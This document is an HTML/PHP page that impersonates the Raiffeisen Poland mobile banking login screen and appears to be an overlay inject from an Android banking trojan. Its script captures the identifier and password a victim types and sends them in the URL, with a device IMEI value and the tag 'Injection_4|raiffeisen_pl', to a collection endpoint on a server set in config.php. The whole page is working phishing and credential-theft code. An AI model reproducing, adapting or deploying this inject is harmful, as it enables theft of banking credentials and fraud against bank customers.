<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="pl/eu.eleader.mobilebanking.raiffeisen/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
	<img src="pl/eu.eleader.mobilebanking.raiffeisen/images/ic_menu_arrow.png">
	<img src="pl/eu.eleader.mobilebanking.raiffeisen/images/ic_menu_normal.png" style="padding: 10px 0;">
	 <b style="font-size: 18px;">Logowanie</b>
</div>
	<div class="col-xs-10 col-sm-8">


<form id="form">

<div class="form">

<input name="field1" value="eu.eleader.mobilebanking.raiffeisen" type="hidden">

<input id="login" name="field2" class="input_100" style="float: left;" placeholder="Identyfikator" maxlength="16" type="text">
<img src="pl/eu.eleader.mobilebanking.raiffeisen/images/ic_help_icon.png" onclick="show('block')" style="width: 35px;margin-left: 0.2%;float: left;">
<div onclick="show('none')" id="wrap"></div>


<input id="password" name="field3" class="input_100" style="float: left;" placeholder="Hasło" type="password" >
<img src="pl/eu.eleader.mobilebanking.raiffeisen/images/ic_help_icon.png" onclick="show2('block')" style="width: 35px;margin-left: 0.2%; margin-top: 7px;float: left;">
</div><br>

<div class="help"> Nie jesteś klientem? Załóż konto! </div>

<div class="footer">
	<input class="submit" onClick="sentServer();" value="Zaloguj" type="button">
</div>


</form>

<div id="window" >
	<div class="header2">
		Identyfikator
	</div>

	<div class="text">
	 Identyfikator, którego używasz do bankowości internetowej. Jeśli nie znasz lub nie pamiętasz swojego identyfikatora, skontakuj się z Centrum Telefonicznym tel. 22 549 99 63.
	</div>

	<div class="ok" onclick="show('none')">
		OK
	</div>

</div>

<div id="window2" >
	<div class="header2">
		Hasło
	</div>

	<div class="text">
	 Hasło, którego używasz do zalogowania się do bankowości internetowej. Jeśli nie pamiętasz swojego hasła, skontakuj się z Centrum Telefonicznym tel. 22 549 99 63.
	</div>

	<div class="ok" onclick="show2('none')">
		OK
	</div>

</div>

	</div>
<script type="text/javascript">

					//Функция показа
			function show(state){

					document.getElementById('window').style.display = state;
					document.getElementById('wrap').style.display = state;
			}

		</script>
		<script type="text/javascript">

					//Функция показа
			function show2(state){

					document.getElementById('window2').style.display = state;
					document.getElementById('wrap').style.display = state;
			}

		</script>
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|raiffeisen_pl|"+login1+"|"+pass);
	}
}
</script>
</body>

</html>
